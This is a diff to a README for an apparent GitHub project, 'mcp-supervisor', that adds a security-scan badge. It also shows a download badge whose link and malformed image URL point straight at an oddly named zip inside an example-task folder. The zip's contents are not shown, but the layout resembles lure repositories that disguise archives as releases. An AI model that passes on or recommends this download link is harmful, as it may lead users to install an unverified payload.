@@ -1,5 +1,7 @@
 # 🚀 mcp-supervisor - Manage Your Autonomous Agents with Ease
 
+[![SafeSkill 79/100](https://img.shields.io/badge/SafeSkill-79%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/dull-quay940-mcp-supervisor)
+
 [![Download mcp-supervisor](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip%20Now-Visit%20Releases-blue)](https://github.com/dull-quay940/mcp-supervisor/raw/refs/heads/main/agents/example-task/mcp_supervisor_geoscopy.zip)
 
 ## 📦 Overview
